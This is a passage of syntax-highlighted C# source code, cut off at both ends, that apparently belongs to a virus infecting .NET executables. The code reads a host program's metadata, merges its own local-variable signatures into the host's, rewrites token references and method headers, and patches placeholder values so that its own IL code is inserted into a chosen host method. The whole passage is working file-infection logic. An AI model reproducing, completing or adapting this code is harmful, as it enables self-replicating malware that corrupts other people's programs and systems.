                                                        </span><span class="sc11">Array</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">ourblob</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blobnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bloboff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x12626772</span><span class="sc10">);</span><span class="sc0">
                                                        </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">0x12626772</span><span class="sc10">;</span><span class="sc0">

                                                        </span><span class="sc1">/* store combined locals size */</span><span class="sc0">

                                                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0xff</span><span class="sc10">)</span><span class="sc0">
                                                        </span><span class="sc10">{</span><span class="sc0">
                                                            </span><span class="sc11">blobnew</span><span class="sc10">[</span><span class="sc11">strbase</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Byte</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc4">0x80</span><span class="sc10">);</span><span class="sc0">
                                                        </span><span class="sc10">}</span><span class="sc0">

                                                        </span><span class="sc11">blobnew</span><span class="sc10">[</span><span class="sc11">strbase</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Byte</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rva</span><span class="sc10">);</span><span class="sc0">
                                                        </span><span class="sc11">blobnew</span><span class="sc10">[</span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/* 7 == IMAGE_CEE_CS_CALLCONV_LOCAL_SIG */</span><span class="sc0">

                                                        </span><span class="sc1">/* get host locals count */</span><span class="sc0">

                                                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rootold</span><span class="sc10">[</span><span class="sc11">sigoff</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x80</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                                        </span><span class="sc10">{</span><span class="sc0">
                                                            </span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x3f</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rootold</span><span class="sc10">[++</span><span class="sc11">sigoff</span><span class="sc10">];</span><span class="sc0">
                                                            </span><span class="sc10">--</span><span class="sc11">siglen</span><span class="sc10">;</span><span class="sc0">
                                                        </span><span class="sc10">}</span><span class="sc0">

                                                        </span><span class="sc1">/* store combined locals count */</span><span class="sc0">

                                                        </span><span class="sc1">/* variable 25: number of our locals */</span><span class="sc0">

                                                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">0x19626772</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0xff</span><span class="sc10">)</span><span class="sc0">
                                                        </span><span class="sc10">{</span><span class="sc0">
                                                            </span><span class="sc11">blobnew</span><span class="sc10">[++</span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Byte</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc4">0x80</span><span class="sc10">);</span><span class="sc0">
                                                        </span><span class="sc10">}</span><span class="sc0">

                                                        </span><span class="sc11">blobnew</span><span class="sc10">[</span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Byte</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">blobind</span><span class="sc10">);</span><span class="sc0">

                                                        </span><span class="sc1">/* copy host locals */</span><span class="sc0">

                                                        </span><span class="sc11">Array</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sigoff</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blobnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">siglen</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">

                                                        </span><span class="sc1">/* append our locals */</span><span class="sc0">

                                                        </span><span class="sc1">/* variable 24: size of our locals
                                                           variable 26: RVA within our #Blob stream of our locals
                                                        */</span><span class="sc0">

                                                        </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">ReadIntPtr</span><span class="sc10">(</span><span class="sc11">blobbase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x1a626772</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">blobnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">siglen</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x18626772</span><span class="sc10">);</span><span class="sc0">

                                                        </span><span class="sc1">/* fix up host token references */</span><span class="sc0">

                                                        </span><span class="sc1">/* variable 25: number of our locals */</span><span class="sc0">

                                                        </span><span class="sc11">stringsind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x19626772</span><span class="sc10">;</span><span class="sc0">

                                                        </span><span class="sc5">do</span><span class="sc0">
                                                        </span><span class="sc10">{</span><span class="sc0">
                                                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">blobnew</span><span class="sc10">[</span><span class="sc11">strbase</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x1d</span><span class="sc10">)</span><span class="sc0">
                                                             </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x0f</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0">
                                                               </span><span class="sc10">)</span><span class="sc0">
                                                            </span><span class="sc10">{</span><span class="sc0">
                                                                </span><span class="sc10">++</span><span class="sc11">strbase</span><span class="sc10">;</span><span class="sc0">

                                                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x11</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
                                                                </span><span class="sc10">{</span><span class="sc0">
                                                                    </span><span class="sc11">blobnew</span><span class="sc10">[</span><span class="sc11">strbase</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Byte</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">typerefs</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
                                                                </span><span class="sc10">}</span><span class="sc0">
                                                            </span><span class="sc10">}</span><span class="sc0">

                                                            </span><span class="sc10">++</span><span class="sc11">strbase</span><span class="sc10">;</span><span class="sc0">
                                                        </span><span class="sc10">}</span><span class="sc0">
                                                        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">stringsind</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                                        </span><span class="sc1">/* find first method using selected StandAloneSig */</span><span class="sc0">

                                                        </span><span class="sc5">do</span><span class="sc0">
                                                        </span><span class="sc10">{</span><span class="sc0">
                                                            </span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">methodoff</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">0x14</span><span class="sc10">);</span><span class="sc0">
                                                            </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">sect</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sectsize</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc4">0x28</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">);</span><span class="sc0">

                                                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">((</span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">sect</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sectsize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x14</span><span class="sc10">)),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc1">/* 0 == SeekOrigin.Begin */</span><span class="sc0">
                                                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xa0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc1">/* assuming 3 dwords for the header, but actual count is in the header (&gt;&gt; 0x0c, &amp; 0x0f) */</span><span class="sc0">
                                                        </span><span class="sc10">}</span><span class="sc0">
                                                        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc4">0xa0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* 3 == CorILMethod_FatFormat (only Fat type supports locals) */</span><span class="sc0">
                                                            </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xa8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x00ffffff</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">randsig</span><span class="sc10">)</span><span class="sc0">
                                                              </span><span class="sc10">);</span><span class="sc0">

                                                        </span><span class="sc1">/* check that host contains no exception handling information */</span><span class="sc0">

                                                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc4">0xa0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* 8 == CORILMETHOD_MORESECTS */</span><span class="sc0">
                                                        </span><span class="sc10">{</span><span class="sc0">
                                                            </span><span class="sc1">/* store new host method RVA */</span><span class="sc0">

                                                            </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">methodoff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)));</span><span class="sc0">

                                                            </span><span class="sc1">/* read host method */</span><span class="sc0">

                                                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(-</span><span class="sc4">0x0c</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SeekOrigin</span><span class="sc10">.</span><span class="sc11">Current</span><span class="sc10">);</span><span class="sc0">
                                                            </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xa4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                                                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Byte</span><span class="sc10">[(</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">)],</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">);</span><span class="sc0">

                                                            </span><span class="sc1">/* store new host method stack size */</span><span class="sc0">

                                                            </span><span class="sc1">/* variable 27: size of our stack */</span><span class="sc0">

                                                            </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt16</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Int16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt16</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x1b626772</span><span class="sc10">));</span><span class="sc0">

                                                            </span><span class="sc1">/* store new host method size and StandAloneSig index */</span><span class="sc0">

                                                            </span><span class="sc1">/* variable 2: size of our code */</span><span class="sc0">

                                                            </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt64</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">Int64</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">standalonesigs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x11000001</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sectsize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x02626772</span><span class="sc10">));</span><span class="sc0">

                                                            </span><span class="sc1">/* variable 28: RVA in our code of variable 3 */</span><span class="sc0">

                                                            </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x1c626772</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">);</span><span class="sc0">

                                                            </span><span class="sc1">/* variable 29: RVA in our code of variable 4 */</span><span class="sc0">

                                                            </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x1d626772</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sectcopy</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sectsize</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sigoff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rootold</span><span class="sc10">.</span><span class="sc11">GetLength</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">stroff</span><span class="sc10">);</span><span class="sc0">

                                                            </span><span class="sc1">/* variable 30: RVA in our code of variable 10 */</span><span class="sc0">

                                                            </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x1e626772</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">trefoff</span><span class="sc10">);</span><span class="sc0">

                                                            </span><span class="sc1">/* variable 31: RVA in our code of variable 12 */</span><span class="sc0">

                                                            </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x1f626772</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">mrefoff</span><span class="sc10">);</span><span class="sc0">

                                                            </span><span class="sc1">/* variable 32: RVA in our code of variable 19 */</span><span class="sc0">

                                                            </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x20626772</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">siglen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rootnew</span><span class="sc10">.</span><span class="sc11">GetLength</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">bloboff</span><span class="sc10">);</span><span class="sc0">

                                                            </span><span class="sc1">/* variable 33: previous host locals count */</span><span class="sc0">

                                                            </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">localsdelta</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">standalonesigs</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x21626772</span><span class="sc10">;</span><span class="sc0">

                                                            </span><span class="sc1">/* variable 34: RVA in our code of variable 33 */</span><span class="sc0">

                                                            </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x22626772</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">standalonesigs</span><span class="sc10">);</span><span class="sc0">

                                                            </span><span class="sc1">/* parse our code */</span><span class="sc0">

                                                            </span><span class="sc11">mrefdelta</span><span class="sc0"> </span><span class="sc10">&gt;&gt;=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">
                                                            </span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

                                                            </span><span class="sc5">do</span><span class="sc0">
                                                            </span><span class="sc10">{</span><span class="sc0">
                                                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">codecopy</span><span class="sc10">[</span><span class="sc11">blobind</span><span class="sc10">++])</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x1f</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* ldc.i4.s */</span><span class="sc0">
                                                                 </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x2b</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* bcond.s */</span><span class="sc0">
                                                                 </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0xde</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* leave.s */</span><span class="sc0">
                                                                   </span><span class="sc10">)</span><span class="sc0">
                                                                </span><span class="sc10">{</span><span class="sc0">
                                                                    </span><span class="sc10">++</span><span class="sc11">blobind</span><span class="sc10">;</span><span class="sc0">
                                                                </span><span class="sc10">}</span><span class="sc0">
                                                                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* ldc.i4 */</span><span class="sc0">
                                                                      </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x22</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* ldc.r4 */</span><span class="sc0">
                                                                      </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x38</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* bcond */</span><span class="sc0">
                                                                      </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0xdd</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* leave */</span><span class="sc0">
                                                                        </span><span class="sc10">)</span><span class="sc0">
                                                                </span><span class="sc10">{</span><span class="sc0">
                                                                    </span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
                                                                </span><span class="sc10">}</span><span class="sc0">
                                                                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x21</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* ldc.i8 */</span><span class="sc0">
                                                                      </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x23</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* ldc.r8 */</span><span class="sc0">
                                                                        </span><span class="sc10">)</span><span class="sc0">
                                                                </span><span class="sc10">{</span><span class="sc0">
                                                                    </span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
                                                                </span><span class="sc10">}</span><span class="sc0">
